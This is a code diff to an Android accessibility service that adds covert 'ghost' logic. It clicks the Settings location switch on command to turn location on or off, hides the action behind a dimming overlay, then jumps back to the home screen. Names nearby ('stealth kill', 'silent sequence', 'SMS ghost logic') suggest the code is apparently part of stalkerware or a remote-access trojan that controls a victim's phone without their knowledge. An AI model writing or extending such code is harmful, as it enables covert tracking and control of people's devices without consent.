@@ -179,6 +179,8 @@ class MyAccessibilityService : AccessibilityService() {
     var dataTargetState: String = "TOGGLE"
     var isWaitingForWifiSettings = false
     var wifiTargetState: String = "TOGGLE"
+    var isWaitingForLocationSettings = false
+    var locationTargetState: String = "TOGGLE"
     var activeSequence: String? = null
     private var sequenceTarget: String? = null
     private var sequenceCmdId: Int = -1
@@ -571,6 +573,56 @@ class MyAccessibilityService : AccessibilityService() {
 
         // --- DEFAULT SMS GHOST LOGIC ---
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
+        }
+
+        if (!isSafeZoneActive(this) && isWaitingForLocationSettings && pkgName.contains("settings")) {
+            val root = getBypassOverlayRoot()
+            val switchNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_widget") 
+                ?: root?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
+            
+            if (!switchNodes.isNullOrEmpty()) {
+                val switchNode = switchNodes.first()
+                val text = switchNode.text?.toString() ?: ""
+                val isCurrentlyOn = switchNode.isChecked || text.equals("On", ignoreCase = true)
+                
+                val needsClick = when (locationTargetState) {
+                    "ENABLE" -> !isCurrentlyOn
+                    "DISABLE" -> isCurrentlyOn
+                    else -> true // TOGGLE
+                }
+
+                if (needsClick) {
+                    var clickTarget: android.view.accessibility.AccessibilityNodeInfo? = switchNode
+                    val bgNodes = root?.findAccessibilityNodeInfosByViewId("com.android.settings:id/switch_background")
+                    if (!bgNodes.isNullOrEmpty() && bgNodes.first().isClickable) {
+                        clickTarget = bgNodes.first()
+                    } else {
+                        while (clickTarget != null && !clickTarget.isClickable) {
+                            clickTarget = clickTarget.parent
+                        }
+                    }
+                    
+                    if (clickTarget != null && clickTarget.isClickable) {
+                        clickTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("GHOST_LOC", "Toggled Location. Target: $locationTargetState")
+                    } else {
+                        DebugLogger.log("GHOST_LOC", "Location toggle node not clickable.")
+                    }
+                } else {
+                    DebugLogger.log("GHOST_LOC", "Location already in target state: $locationTargetState.")
+                }
+                
+                isWaitingForLocationSettings = false
+                
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    performGlobalAction(GLOBAL_ACTION_HOME)
+                }, 800)
+                
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                    DimmerManager.removeOverlay(applicationContext)
+                }, 2500)
+            }
         }
 
         if (!isSafeZoneActive(this) && isWaitingForWifiSettings && pkgName.contains("settings")) {
@@ -1851,6 +1903,7 @@ class MyAccessibilityService : AccessibilityService() {
         isSilentSequence = false
         isWaitingForDataSettings = false
         isWaitingForWifiSettings = false
+        isWaitingForLocationSettings = false
         isPerformingStealthKill = false
         getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
         DebugLogger.log("FAILSAFE", "All Accessibility sequences aborted.")
